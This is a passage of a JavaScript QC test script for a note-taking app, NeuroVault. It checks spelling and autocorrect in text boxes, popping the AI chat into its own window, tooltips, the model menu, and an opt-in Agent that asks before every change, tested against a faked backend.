          Q.tip = `"${TIP.el && !TIP.el.hidden ? txt(TIP.el) : 'hidden'}"`; tipHide(); TIP.wait = wait0;
          if (Q.tip !== '"Screenshot 2026-10-18 232051 (edited 6).png"') qb('the full name in NeuroVault’s tooltip when it’s cut', Q.tip);
          const short = [...m.querySelectorAll('.cl-attm-add')].find(b => b.dataset.tip === 'stage-zero.html'); TIP.wait = 0; short?.dispatchEvent(new PointerEvent('pointerover', { bubbles: true })); await new Promise(r => setTimeout(r, 30));
          if (TIP.on === short) qb('a name that isn’t cut gets no tooltip', ''); tipHide(); TIP.wait = wait0;
        }
        document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true })); await tick();
      }
      CLOUD.att = false; CLOUD.attPick = {}; CLOUD.attMenu = null; CLOUD.vault = null; AIC.mode = 'dock'; AIC.open = false; n.md = md0; n.html = null; set({ screen: '1920x1080' }); reset(); aiDemo('ready'); renderAll();
    } finally { window.pywebview = PYW; } }
    // 4g · QC 102: NeuroVault's spelling help in the Ask input and every other prose box: the dotted line (spellcheck), autocorrect
    //      with Backspace and Ctrl+Z to undo (and learning: an undone word isn't corrected again), the right-click suggestions with
    //      Ctrl+Z; the boxes covered, search boxes not; captions and pin notes are the note's own; a box in a split pane keeps the
    //      menu; "Only in notes" turns it off in the Ask input
    { const PYW = window.pywebview; window.pywebview = undefined; try {   // its own starting state: no app (the staging bridge's config and notes stay out); withApi fakes one where it's needed
      const Q = N.qc102 = {}, qb = (k, v) => bad('QC 102 ' + k, v), txt = e => (e?.textContent || '').replace(/\s+/g, ' ').trim();
      const keyOn = (k, o = {}) => document.activeElement.dispatchEvent(new KeyboardEvent('keydown', { key: k, bubbles: true, cancelable: true, ...o }));
      const was = { where: SPW.where, spell: S.a11y.spell, ac: ACOR.cfg.on };
      reset(); aiDemo('ready'); SPW.where = 'everywhere'; S.a11y.spell = true; ACOR.cfg.on = true; ACOR.last = null; FUNDO.last = null; delete ACOR.skip['field:aic-in'];
      set({ screen: '1920x1080', view: 'notes', modal: null, inspector: 'shown' }); AIC.mode = 'dock'; app.querySelector('[data-act="ain-ask"]').click(); await tick();
      const fld = () => app.querySelector('#aic-in');
      const put = md => { let el = fld(); el.focus(); el.value = md; el.setSelectionRange(md.length, md.length); el.dispatchEvent(new Event('input', { bubbles: true })); el = fld(); el.focus(); el.setSelectionRange(md.length, md.length); return el; };
      const space = async el => { el.dispatchEvent(new InputEvent('beforeinput', { inputType: 'insertText', data: ' ', bubbles: true, cancelable: true })); el.setRangeText(' ', el.value.length, el.value.length, 'end'); el.dispatchEvent(new Event('input', { bubbles: true })); for (let i = 0; i < 8; i++) await tick(); };
      let el = fld(); Q.line = `field ${spellField(el)} · spellcheck ${el?.spellcheck}`;
      if (spellField(el) !== 'write' || el?.spellcheck !== true) qb('the Ask input gets the dotted line', Q.line);
      // autocorrect, then Backspace gives the word back, and it isn't corrected again
      el = put('I recieve'); await space(el); Q.ac = fld().value;
      if (Q.ac !== 'I receive ') qb('autocorrect in the Ask input', Q.ac);
      fld().focus(); keyOn('Backspace'); await tick(2); Q.back = fld().value;
      if (Q.back !== 'I recieve ') qb('Backspace straight after keeps what you typed', Q.back);
      el = put('I recieve it and recieve'); await space(el); Q.learn = fld().value;
      if (Q.learn !== 'I recieve it and recieve ' || !ACOR.skip['field:aic-in']?.has('recieve')) qb('an undone correction isn’t made again', Q.learn);
      delete ACOR.skip['field:aic-in']; ACOR.last = null; FUNDO.last = null;
      // Ctrl+Z straight after autocorrect
      el = put('It occured'); await space(el); const fixed = fld().value; fld().focus(); keyOn('z', { ctrlKey: true }); await tick(2); Q.ctrlz = `"${fixed}" → Ctrl+Z "${fld().value}"`;
      if (fixed !== 'It occurred ' || fld().value !== 'It occured ') qb('Ctrl+Z straight after autocorrect', Q.ctrlz);
      delete ACOR.skip['field:aic-in']; ACOR.last = null; FUNDO.last = null;
      // the right-click suggestions, a pick, Ctrl+Z
      el = put('I recieve it'); djCtxClose(); S.ctx = null; el.setSelectionRange(3, 3);
      { const b = el.getBoundingClientRect(), at = document.caretPositionFromPoint; document.caretPositionFromPoint = () => ({ offsetNode: el, offset: 4 });
        try { el.dispatchEvent(new MouseEvent('contextmenu', { bubbles: true, cancelable: true, clientX: b.left + 30, clientY: b.top + b.height / 2, button: 2 })); } finally { document.caretPositionFromPoint = at; } }
      for (let i = 0; i < 6; i++) await tick();
      const m = app.querySelector('.menu--word'), fix = m?.querySelector('[data-act="ctx-fix"]');
      Q.menu = m ? [...m.querySelectorAll('.menu-label, .menu-item')].map(x => x.textContent.trim()).join(' | ') : 'none';
      fix?.dispatchEvent(new PointerEvent('pointerup', { bubbles: true, cancelable: true, button: 0 })); for (let i = 0; i < 3; i++) await tick();
      const picked = fld()?.value; fld()?.focus(); keyOn('z', { ctrlKey: true }); await tick(2);
      Q.pick = `"${picked}" · Ctrl+Z "${fld()?.value}"`;
      if (fix?.dataset.v !== 'receive' || picked !== 'I receive it' || fld()?.value !== 'I recieve it') qb('right-click suggestions in the Ask input, a pick, Ctrl+Z', `${Q.menu} → ${Q.pick}`);
      djCtxClose(); ACOR.last = null; FUNDO.last = null;
      // a writing box in a split pane keeps the spelling menu
      { const pb = document.createElement('div'); pb.className = 'pane-body'; pb.innerHTML = '<input id="ld-add" value="I recieve it">'; app.append(pb); const f = pb.firstChild; f.focus(); S.ctx = null;
        const b = f.getBoundingClientRect(), at = document.caretPositionFromPoint; document.caretPositionFromPoint = () => ({ offsetNode: f, offset: 4 });
        try { f.dispatchEvent(new MouseEvent('contextmenu', { bubbles: true, cancelable: true, clientX: b.left + 20, clientY: b.top + 5, button: 2 })); } finally { document.caretPositionFromPoint = at; }
        Q.pane = `${S.ctx?.kind} ${S.ctx?.field}`; pb.remove(); djCtxClose();
        if (Q.pane !== 'word #ld-add') qb('a writing box in a split pane keeps the spelling menu', Q.pane); }
      // every prose box is covered, and boxes that aren't prose aren't
      const probe = (tag, id, cls = '') => { const e = document.createElement(tag); e.id = id; if (cls) e.className = cls; app.append(e); const k = spellField(e); e.remove(); return k; };
      const PROSE = [['input', 'dump-input'], ['input', 'ld-add'], ['textarea', 'sticky-x1', 'sticky-text'], ['input', 'new-task-title'], ['input', 'new-step-text'], ['input', 'wrap-starter-input'], ['input', 'wrap-win-text'],
        ['textarea', 'wrap-note'], ['input', 'milestone-input'], ['input', 'qt-milestone'], ['input', 'phe-textin'], ['input', 'ain-ask-q'], ['input', 'ain-rule'], ['textarea', 'aic-in']];
      const NOT = [['input', 'search-input'], ['textarea', 'raw-markdown-textarea'], ['input', 'note-tags-input'], ['input', 'cl-attq'], ['input', 'bm-q'], ['input', 'palette-input'], ['input', 'ac-never-field'], ['input', 'att-ren-input']];
      Q.boxes = PROSE.filter(([t, id, c]) => probe(t, id, c) !== 'write').map(x => x[1]).join(', ') || 'all covered';
      Q.not = NOT.filter(([t, id]) => probe(t, id)).map(x => x[1]).join(', ') || 'none';
      if (Q.boxes !== 'all covered') qb('every prose box gets spelling help', Q.boxes);
      if (Q.not !== 'none') qb('search, tags, names and Raw .md get none', Q.not);
      set({ view: 'tasks', modal: null }); Q.task = `${spellField(app.querySelector('#new-task-title'))} ${app.querySelector('#new-task-title')?.spellcheck}`; set({ view: 'notes' });
      if (Q.task !== 'write true') qb('a new task’s title, drawn, has the line', Q.task);
      // photo captions and pin notes are the note's own text: spelling and autocorrect reach them
      { const d = document.createElement('div'); d.className = 'doc'; d.innerHTML = '<p class="ph-cap-p"><span class="ph-hide"><a class="wikilink">attachments/a.png</a></span><br><em class="ph-cap">Teh caption</em></p><ol><li>Pin note</li></ol>'; app.append(d);
        const em = d.querySelector('em'), li = d.querySelector('li'); Q.cap = `caption ${!em.closest(ACOR_SKIP) && !em.closest(SP_SKIP)} · pin ${!li.closest(ACOR_SKIP) && !li.closest(SP_SKIP)}`; d.remove();
        if (Q.cap !== 'caption true · pin true') qb('captions and pin notes get the note’s spelling help', Q.cap); }
      // Only in notes: the Ask input has none
      SPW.where = 'notes'; renderAll(); await tick(); Q.notes = `${spellField(fld())} ${fld()?.spellcheck}`;
      if (Q.notes !== 'null false') qb('Only in notes: the Ask input has none', Q.notes);
      SPW.where = was.where; S.a11y.spell = was.spell; ACOR.cfg.on = was.ac; ACOR.last = null; FUNDO.last = null; delete ACOR.skip['field:aic-in'];
      AIC.drafts = {}; AIC.open = false; reset(); aiDemo('ready'); renderAll(); } finally { window.pywebview = PYW; } }
    // 4h · QC 103: in the desktop app, Float opens the chat in its own window (pop_out "ask"), and the chat leaves NeuroVault's dock;
    //      the header's Ask shows that window; the chat goes across (pop_ask_sync, with the note) and comes back (nvSync "ask"),
    //      one answer at a time, Stop from either; its window closing docks the chat again, waiting for an answer still coming;
    //      the window itself: the chat filling it, its head the strip, Keep on top, Back into NeuroVault and Close, no Float
    { const PYW = window.pywebview; window.pywebview = undefined; try {   // its own starting state: no app (the staging bridge's config and notes stay out); withApi fakes one where it's needed
      const Q = N.qc103 = {}, qb = (k, v) => bad('QC 103 ' + k, v), txt = e => (e?.textContent || '').replace(/\s+/g, ' ').trim();
      reset(); aiDemo('ready'); POPS.items = []; AIC.chats = {}; AIC.busy = null; AIC.sent = null;
      set({ screen: '1920x1080', view: 'notes', modal: null, inspector: 'shown' }); AIC.mode = 'dock'; app.querySelector('[data-act="ain-ask"]').click(); await tick();
      const n = note(), key = aicKey(n), OUT = [{ kind: 'ask', id: null, key: 'ask', on_top: true }];
      aicChat(key).turns = [{ q: 'When is the audit?', scope: 'note', answers: [{ text: 'On Friday.', by: 'Qwen3.5 4B', pending: null, t0: Date.now(), secs: 2 }], at: 0 }]; renderAll();
      let calls = await withApi({ pop_out: () => ({ status: 'success', popped: OUT }) }, async () => { app.querySelector('[data-act="aic-dock"]').click(); await tick(8); });
      const out = calls.find(c => c[0] === 'pop_out'), sync = calls.find(c => c[0] === 'pop_ask_sync')?.[1][0];
      Q.out = `${out ? out[1].join(',') : 'no pop_out'} · dock gone ${!app.querySelector('[data-aic-win]')} · open ${AIC.open} · link "${txt(app.querySelector('.pop-link'))}" · sync ${sync ? `note ${sync.note?.id === n.id} turns ${sync.chat?.turns.length}` : 'none'}`;
      if (!out || out[1][0] !== 'ask' || app.querySelector('[data-aic-win]') || AIC.open || !isOut('ask') || !/1 on your desktop/.test(txt(app.querySelector('.pop-link'))) || sync?.note?.id !== n.id || sync?.chat?.turns.length !== 1 || !sync.from)
        qb('Float pops the chat out, the dock gives it up, the chat and its note go across', Q.out);
      if (app.querySelector('.aic-win--float')) qb('no in-page float while it has its own window', '');
      // the header's Ask brings that window up
      calls = await withApi({}, async () => { app.querySelector('[data-act="ain-ask"]').click(); await tick(2); });
      Q.show = calls.map(c => `${c[0]} ${c[1].join(',')}`).join(' | ');
      if (!calls.some(c => c[0] === 'pop_show' && c[1][0] === 'ask') || app.querySelector('[data-aic-win]')) qb('the header’s Ask shows the chat’s window', Q.show);
      // the chat's window asked: NeuroVault's copy follows, one answer at a time; Stop from here stops it there
      const from = 'other-win', turn2 = { q: 'Who owns it?', scope: 'note', answers: [{ text: 'Ma', by: 'Qwen3.5 4B', pending: 'stream', t0: Date.now() }], at: 0 };
      window.nvSync({ kind: 'ask', data: { from, key, chat: { turns: [...aicChat(key).turns, turn2] }, past: [], scope: 'note', busy: { key, noteId: n.id, job: 'J9' } } }); await tick();
      Q.in = `turns ${aicChat(key).turns.length} · busy ${JSON.stringify(AIC.busy && { remote: AIC.busy.remote, job: AIC.busy.job, ans: AIC.busy.ans?.text })}`;
      if (aicChat(key).turns.length !== 2 || !AIC.busy?.remote || AIC.busy.job !== 'J9' || AIC.busy.ans?.text !== 'Ma') qb('the other window’s question shows here, answering there', Q.in);
      calls = await withApi({}, async () => { await aicStop(); await tick(); }); Q.stop = calls.map(c => `${c[0]} ${c[1].join(',')}`).join(' | ');
      if (!calls.some(c => c[0] === 'ai_job_cancel' && c[1][0] === 'J9') || !AIC.busy?.remote) qb('Stop here stops the answer in the other window', Q.stop);
      // its own messages aren't taken back
      window.nvSync({ kind: 'ask', data: { from: AIC_WIN, key, chat: { turns: [] }, past: [], busy: null } }); await tick();
      if (aicChat(key).turns.length !== 2) qb('a window never takes its own message back', aicChat(key).turns.length);
      // its window closes while the answer is still coming: docked again, and NeuroVault waits for the answer
      calls = await withApi({ ai_job: () => ({ status: 'success', state: 'done', result: { answer: 'Maya owns the audit.', by: 'Qwen3.5 4B' } }) }, async () => {
        window.nvSync({ kind: 'popped', items: [], back: null, closed: 'ask', gone: null }); await until(() => !AIC.busy, 60); await tick(3); });
      const last = aicChat(key).turns[1]?.answers[0];
      Q.back = `open ${AIC.open} · mode ${AIC.mode} · tab ${S.tab} · dock ${!!app.querySelector('.aic-win--dock')} · polled ${calls.filter(c => c[0] === 'ai_job').map(c => c[1][0]).join(',')} · answer "${last?.text}" ${last?.pending}`;
      if (!AIC.open || AIC.mode !== 'dock' || S.tab !== 'ask' || !app.querySelector('.aic-win--dock') || !calls.some(c => c[0] === 'ai_job' && c[1][0] === 'J9') || last?.text !== 'Maya owns the audit.' || last?.pending)
        qb('its window closing docks the chat again, and the answer still coming lands here', Q.back);
      if (!/Maya owns the audit\./.test(txt(app.querySelector('.aic-win--dock')))) qb('the docked chat shows the whole conversation', txt(app.querySelector('.aic-win--dock')).slice(0, 120));
      // the window's own page: the chat fills it; its strip has Keep on top, Back into NeuroVault and Close, and no Float
      POPS.items = OUT; const h = aicPopCard(), box = document.createElement('div'); box.innerHTML = h; POPS.items = [];
      const w = box.querySelector('.aic-win--pop'), head = w?.querySelector('.aic-head');
      Q.pop = `head drag ${head?.hasAttribute('data-drag-widget')} · ${[...(head?.querySelectorAll('button') || [])].map(b => b.dataset.act + (b.dataset.v ? ':' + b.dataset.v : '')).join(' ')} · input ${!!w?.querySelector('#aic-in')} · grip ${!!w?.querySelector('.st-grip')}`;
      if (!w || !head?.hasAttribute('data-drag-widget') || !head.querySelector('[data-act="pop-top"][data-v="ask"]') || !head.querySelector('[data-act="pop-in"][data-v="ask"]') || !head.querySelector('[data-act="pop-close"][data-v="ask"]')
        || head.querySelector('[data-act="aic-dock"], [data-act="aic-close"]') || !w.querySelector('#aic-in') || !w.querySelector('.st-grip') || !/Maya owns the audit\./.test(txt(w))) qb('the chat’s own window: the chat, its strip and buttons', Q.pop);
      if (spellField(w?.querySelector('#aic-in')) !== 'write') qb('spelling help in the chat’s own window too', '');
      // the desktop app says no (a browser with the dev bridge): Float falls back to the in-page window
      AIC.mode = 'dock'; AIC.open = true; aicToTab(); renderAll();
      calls = await withApi({ pop_out: () => ({ status: 'error', message: 'Popping out needs the desktop app.' }) }, async () => { app.querySelector('[data-act="aic-dock"]')?.click(); await tick(6); });
      Q.refused = `${calls.filter(c => c[0] === 'pop_out').length} pop_out · mode ${AIC.mode} · float ${!!app.querySelector('.aic-win--float')}`;
      if (!calls.some(c => c[0] === 'pop_out') || AIC.mode !== 'float' || !app.querySelector('.aic-win--float')) qb('when the app can’t pop it out, Float is the in-page window', Q.refused);
      // in a plain browser, Float stays the in-page window
      AIC.mode = 'dock'; AIC.open = true; aicToTab(); renderAll(); app.querySelector('[data-act="aic-dock"]')?.click(); await tick();
      Q.browser = `mode ${AIC.mode} · float ${!!app.querySelector('.aic-win--float')}`;
      if (AIC.mode !== 'float' || !app.querySelector('.aic-win--float')) qb('without the desktop app, Float is the in-page window', Q.browser);
      AIC.mode = 'dock'; AIC.chats = {}; AIC.busy = null; AIC.sent = null; AIC.open = false; POPS.items = []; reset(); aiDemo('ready'); renderAll(); } finally { window.pywebview = PYW; } }
    // 4i · v0.1.1 should-fix 6: the spelling and homophone marks carry NeuroVault's own tooltip (data-tip), no Windows title,
    //      and it shows on hovering a mark inside the note; should-fix 7: a model that isn't on says "off" in the Ask model menu,
    //      and no row's second part is cut off, at 1366 and 1920
    { const PYW = window.pywebview; window.pywebview = undefined; try {
      const Q = N.sf67 = {}, qb = (k, v) => bad('v0.1.1 ' + k, v), txt = e => (e?.textContent || '').replace(/\s+/g, ' ').trim();
      const was = { spell: S.a11y.spell, homo: S.a11y.homophones, wait: TIP.wait };
      reset(); aiDemo('ready'); S.a11y.spell = true; S.a11y.homophones = true; set({ screen: '1366x768', view: 'notes', modal: null, inspector: 'shown' });
      const n = note(), md0 = n.md; clearTimeout(n.saveT); n.docDirty = false; n.md = 'We recieve it over their desk, quite quiet.'; n.html = null; renderAll(); await tick(2);
      const marks = [...app.querySelectorAll('.doc .spell, .doc .homophone')];
      Q.marks = marks.map(m => `${m.className}:${m.textContent}:${tipAttr.call(m, 'title') == null ? 'no title' : 'TITLE'}:${tipAttr.call(m, 'data-tip') ? 'tip' : 'no tip'}`).join(' | ');
      if (marks.length < 3 || marks.some(m => tipAttr.call(m, 'title') != null || !tipAttr.call(m, 'data-tip'))) qb('should-fix 6: the marks carry data-tip, never a native title', Q.marks);
      // its own state: nothing else open or scrolling (a tooltip closes on any scroll, as it should), the toolbar's Autohide off
      // (QC 110), and the draws above settled; if it still closes, the scroll that closed it is named
      const tbHide0 = PAR.tb.hide; PAR.tb.hide = 'off'; parTbShow(false); AIC.open = false; AIC.menu = null; renderAll();
      for (let i = 0; i < 3; i++) await new Promise(r => requestAnimationFrame(() => r()));
      const scrolls = [], onScroll = e => scrolls.push(e.target === document ? 'document' : (e.target.className || e.target.tagName || '').toString().slice(0, 40));
      document.addEventListener('scroll', onScroll, true);
      const sp = app.querySelector('.doc .spell'); TIP.wait = 0;
      sp?.dispatchEvent(new PointerEvent('pointerover', { bubbles: true }));
      for (let i = 0; i < 20 && TIP.on !== sp; i++) await new Promise(r => setTimeout(r, 15));
      await tick(); document.removeEventListener('scroll', onScroll, true); PAR.tb.hide = tbHide0;
      Q.tip = `"${TIP.el?.hidden === false ? txt(TIP.el) : 'hidden'}" · on the mark ${TIP.on === sp}${scrolls.length ? ` · closed by a scroll of ${[...new Set(scrolls)].join(', ')}` : ''}`;
      if (TIP.on !== sp || !/Spelling: did you mean receive\?/.test(txt(TIP.el))) qb('should-fix 6: hovering a mark in the note shows NeuroVault’s tooltip', Q.tip);
      tipHide(); TIP.wait = was.wait;
      n.md = md0; n.html = null; S.a11y.spell = was.spell; S.a11y.homophones = was.homo; renderAll();
      // should-fix 7: Ollama and LM Studio not on: "off", and nothing in a row is cut short
      for (const sc of ['1366x768', '1920x1080']) {
        set({ screen: sc, view: 'notes', modal: null, inspector: 'shown' }); AIC.mode = 'dock'; AIC.open = false; app.querySelector('[data-act="ain-ask"]').click(); await tick();
        app.querySelector('[data-aic-opener="opts"]')?.click(); await tick(2);
        const rows = [...app.querySelectorAll('[data-aic-menu] .menu-item')], off = rows.filter(r => r.getAttribute('aria-disabled') === 'true');
        const cut = [...app.querySelectorAll('[data-aic-menu] .aic-where, [data-aic-menu] .truncate, [data-aic-menu] .cl-mname')].filter(e => e.scrollWidth > e.clientWidth + 1).map(e => txt(e));
        Q[sc] = `off rows: ${off.map(r => `${txt(r.querySelector('.truncate, .cl-mname'))} "${txt(r.querySelector('.aic-where'))}"`).join(', ')} · cut: ${cut.join(', ') || 'none'}`;
        if (!off.length || off.some(r => txt(r.querySelector('.aic-where')) !== 'off') || cut.length || /not ru/.test(txt(app.querySelector('[data-aic-menu]')))) qb(`should-fix 7: the model menu says "off", nothing cut (${sc})`, Q[sc]);
        AIC.menu = null; AIC.open = false; renderAll();
      }
      set({ screen: '1920x1080' }); reset(); aiDemo('ready'); renderAll();
    } finally { window.pywebview = PYW; } }
    // 4j · R67 the Agent: off by default (its choice in Ask says "off · Settings" and opens its settings); on, it's the third choice;
    //      its intro; a request with a fake app: the steps as they come, a task waiting (Add task, Edit, Skip), Edit then Add, a line
    //      skipped, done ("Nothing else changed") and Undo all; the step limit with Carry on; the change limit; Stop; a model that
    //      can't use tools; the first-use notice names what goes; at 1366 nothing runs out of the chat
    if (await cloudOk('R67')) { const PYW = window.pywebview; window.pywebview = undefined; try {
      const Q = N.r67 = {}, qb = (k, v) => bad('R67 ' + k, v), txt = e => (e?.textContent || '').replace(/\s+/g, ' ').trim();
      const was = { on: AGT.on, tools: [...AGT.tools] };
      reset(); aiDemo('ready'); cloudDemoFill(AI.st); AGT.on = false; AGT.tools = AGT_TOOLS.map(t => t[0]); AIC.scope = 'note'; AIC.chats = {}; AIC.busy = null;
      const local = m => { AI.st.installed = [...new Set([...(AI.st.installed || []), m])]; AI.st.route.qa = 'local:' + m; const nm = aiModel(m)?.name || m;
        AI.st.routes.qa = { kind: 'local', model: m, label: `On this PC · ${nm}`, ready: true, name: nm }; AI.st.engine.model = m; AI.st.engine.state = 'running'; renderAll(); };
      local('qwen35-4b'); set({ screen: '1366x768', view: 'notes', modal: null, inspector: 'shown' }); AIC.mode = 'dock'; app.querySelector('[data-act="ain-ask"]').click(); await tick();
      const openMenu = async () => { app.querySelector('[data-aic-opener="opts"]')?.click(); await tick(2); return app.querySelector('[data-aic-menu] .agt-mi'); };
      // off: the choice says so and opens its settings
      let mi = await openMenu(); Q.off = `"${txt(mi)}"`;
      if (!mi || !/^Agent: can search, read and add/.test(txt(mi)) || !/off · Settings$/.test(txt(mi))) qb('off by default: the third choice says “off · Settings”', Q.off);
      mi?.click(); await tick(3);
      const sw = app.querySelector('[data-ais-sec="agent"] [data-act="agt-on"]'); Q.settings = `modal ${S.modal} · tab ${AIS.tab} · switch ${sw?.getAttribute('aria-checked')} · scope ${AIC.scope}`;
      if (S.modal !== 'settings' || AIS.tab !== 'jobs' || sw?.getAttribute('aria-checked') !== 'false' || AIC.scope === 'agent') qb('off: picking it opens Settings → AI models → Agent, off', Q.settings);
      sw?.click(); await tick();
      const rows = [...app.querySelectorAll('[data-ais-sec="agent"] [data-agt-row]')].map(r => r.dataset.agtRow);
      Q.on = `${AGT.on} · rows ${rows.join(',')} · lock ${app.querySelector('[data-agt-row="ask"] .toggle')?.getAttribute('aria-disabled')}`;
      if (!AGT.on || rows.join(',') !== 'on,search_notes,read_note,summarise_note,create_task,append_to_note,add_tags,link_notes,ask,limits' || app.querySelector('[data-agt-row="ask"] .toggle')?.getAttribute('aria-disabled') !== 'true') qb('on: its seven tools, Ask before every change (locked on), the limits', Q.on);
      app.querySelector('[data-act="agt-tool"][data-v="append_to_note"]')?.click(); await tick(); const offTool = !AGT.tools.includes('append_to_note'); app.querySelector('[data-act="agt-tool"][data-v="append_to_note"]')?.click(); await tick();
      if (!offTool || !AGT.tools.includes('append_to_note')) qb('each tool can be turned off and on', AGT.tools.join(','));
      set({ modal: null }); AIC.open = false; app.querySelector('[data-act="ain-ask"]').click(); await tick();
      mi = await openMenu(); Q.pick = `"${txt(mi)}"`; mi?.click(); await tick(2);
      const hello = app.querySelector('.agt-hello'), ctl = app.querySelector('[data-aic-opener="opts"]'), ta = app.querySelector('#aic-in');
      Q.pick += ` · scope ${AIC.scope} · control "${txt(ctl)}" · hello "${txt(hello).slice(0, 80)}" · ph "${ta?.placeholder}" · about "${txt(app.querySelector('.agt-about'))}"`;
      if (!/asks first$/.test(txt(mi)) || AIC.scope !== 'agent' || !/^Agent · /.test(txt(ctl)) || !/It asks before every change/.test(txt(hello)) || !/At most 8 steps and 3 changes/.test(txt(hello)) || ta?.placeholder !== 'Ask the Agent to do something with your notes…' || !/^Agent · Qwen3\.5 4B · this PC$/.test(txt(app.querySelector('.agt-about'))))
        qb('on: the third choice, its intro, the control and the head say Agent', Q.pick);
      // a request: the fake app's run
      const n = note(), STEPS = [{ k: 'search', text: 'Searched your notes for “audit”', sub: '3 found: Q3 Roadmap Draft, Meeting notes, 1:1 with Maya', st: 'done' }, { k: 'read', text: 'Read “Q3 Roadmap Draft”', sub: '', st: 'done' }, { k: 'read', text: 'Read “1:1 with Maya”', sub: '', st: 'done' }];
      let phase = 0; const base = { run: 'R1', code: '', error: '', by: 'Qwen3.5 4B', sent_to: null, skipped: 0, answer: '', budget: 8, max_steps: 8, max_writes: 3, reads: 2, secs: 9 };
      const TASK = { kind: 'task', n: 1, title: 'Email Maya about the audit budget', due: '2026-10-23', note_id: rawId(n.id), note_title: n.title };
      const snap = () => phase === 0 ? { ...base, state: 'running', used: 4, steps: [...STEPS, { k: 'sum', text: 'Summarising “Meeting notes”', sub: '', st: 'run' }], writes: [], pending: null }
        : phase === 1 ? { ...base, state: 'waiting', used: 5, steps: [...STEPS, { k: 'task', text: 'Wants to add a task', sub: '', st: 'wait' }], writes: [], pending: TASK }
        : phase === 2 ? { ...base, state: 'waiting', used: 6, steps: [...STEPS, { k: 'task', text: 'Added the task “Email Maya about the budget by Friday”', sub: 'due 2026-10-23', st: 'done' }, { k: 'append', text: 'Wants to add a line', sub: '', st: 'wait' }],
          writes: [{ kind: 'task', task_id: 901, title: 'Email Maya about the budget by Friday', task: { id: 901, title: 'Email Maya about the budget by Friday', note_id: rawId(n.id), priority: 'Medium', due_date: '2026-10-23', completed: 0, energy: 'medium', created_at: '' } }],
          pending: { kind: 'append', n: 2, note_id: rawId(n.id), note_title: n.title, text: 'Ask Clearline for a phased price.' } }
        : { ...base, state: 'done', used: 6, skipped: 1, answer: 'Three things are left on the audit. I added a task to email Maya.', steps: [...STEPS, { k: 'task', text: 'Added the task “Email Maya about the budget by Friday”', sub: '', st: 'done' }, { k: 'append', text: `Skipped adding to “${n.title}”`, sub: '', st: 'skip' }],
          writes: [{ kind: 'task', task_id: 901, title: 'Email Maya about the budget by Friday' }], pending: null };
      const fake = { ai_agent: () => ({ status: 'success', ...snap() }), ai_agent_poll: () => ({ status: 'success', ...snap() }),
        ai_agent_change: (run, choice, fields) => { phase = phase === 1 ? 2 : 3; return { status: 'success', ...snap() }; }, ai_agent_stop: () => ({ status: 'success', ...snap(), state: 'stopped' }),
        ai_agent_undo: () => ({ status: 'success', undone: 1, kept: [], notes: {}, tasks: [901], ...snap() }) };
      const typeAsk = async q => { const t = app.querySelector('#aic-in'); t.value = q; t.dispatchEvent(new Event('input', { bubbles: true })); t.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true })); };
      let calls = await withApi(fake, async () => {
        await typeAsk('Find what’s left on the audit and add a task to email Maya'); await until(() => app.querySelector('.agt-step.is-run'), 40);
        Q.working = `"${txt(app.querySelector('.agt-run'))}" · steps ${app.querySelectorAll('.agt-step').length} · stop ${!!app.querySelector('[data-act="aic-stop"]')}`;
        phase = 1; await until(() => app.querySelector('[data-agt-card="task"]'), 60); await tick(2);
        const card = app.querySelector('[data-agt-card="task"]');
        Q.card = `"${txt(card)}" · run "${txt(app.querySelector('.agt-run'))}" · buttons ${[...card.querySelectorAll('button')].map(b => txt(b)).join('|')}`;
        const cr = card.getBoundingClientRect(), wr = app.querySelector('[data-aic-win]').getBoundingClientRect();
        Q.fits = `card ${Math.round(cr.left)}–${Math.round(cr.right)} in ${Math.round(wr.left)}–${Math.round(wr.right)} · overflow ${[...card.querySelectorAll('*')].filter(e => e.scrollWidth > e.clientWidth + 1 && getComputedStyle(e).overflow !== 'visible').length}`;
        card.querySelector('[data-act="agt-edit"]').click(); await tick(2);
        const ti = app.querySelector('#agt-e-title'); Q.edit = `focus ${document.activeElement?.id} · title "${ti?.value}" · due "${app.querySelector('#agt-e-due')?.value}"`;
        ti.value = 'Email Maya about the budget by Friday'; app.querySelector('[data-act="agt-esave"]').click(); await until(() => app.querySelector('[data-agt-card="append"]'), 60); await tick(2);
        Q.append = `"${txt(app.querySelector('[data-agt-card="append"]'))}" · task in Tasks ${D.tasks.some(t => rawId(t.id) === 901)}`;
        app.querySelector('[data-agt-card="append"] [data-act="agt-skip"]').click(); await until(() => !AIC.busy && app.querySelector('.agt-note.is-ok'), 60); await tick(2);
        Q.done = `"${txt(app.querySelector('.agt-runbox.is-done'))}"`;
        app.querySelector('[data-act="agt-undo"]').click(); await tick(4);
        Q.undo = `"${txt(app.querySelector('.agt-undone'))}" · task gone ${!D.tasks.some(t => rawId(t.id) === 901)}`; });
      const ch = calls.filter(c => c[0] === 'ai_agent_change').map(c => `${c[1][1]} ${JSON.stringify(c[1][2])}`);
      Q.calls = `${calls.find(c => c[0] === 'ai_agent')?.[1].join(' | ')} · changes ${ch.join(' ; ')} · undo ${calls.some(c => c[0] === 'ai_agent_undo')}`;
      if (!/^Agent\s*Step 4 of 8\s*·\s*no changes yet$/.test(Q.working.split('" ·')[0].slice(1)) || !/steps 4/.test(Q.working) || !/stop true/.test(Q.working)) qb('working: the step row, each step as it comes, Stop', Q.working);
      if (!/^"Add this task\?change 1 · at most 3Email Maya about the audit budgetPriorityNot set \(Medium\)EnergyNot setDueFri 23 OctProjectNoneFromQ3 Roadmap Draft/.test(Q.card) || !/run "Agent\s*Step 5 of 8\s*·\s*waiting for you"/.test(Q.card) || !/buttons Add task\|Edit\|Skip$/.test(Q.card)) qb('a task waiting: Add task, Edit, Skip, with what it would be', Q.card);
      if (!/overflow 0$/.test(Q.fits) || (() => { const m = Q.fits.match(/card (\d+)–(\d+) in (\d+)–(\d+)/); return !m || +m[1] < +m[3] || +m[2] > +m[4]; })()) qb('the card fits inside the chat at 1366', Q.fits);
      if (!/^focus agt-e-title · title "Email Maya about the audit budget" · due "2026-10-23"$/.test(Q.edit)) qb('Edit: the task’s words, due date and note, the title focused', Q.edit);
      if (!/^"Add this to the end of “.+”\?change 2 · at most 3Ask Clearline for a phased price\.\s*Add itEditSkip" · task in Tasks true$/.test(Q.append)) qb('the task is in Tasks; the next change waits', Q.append);
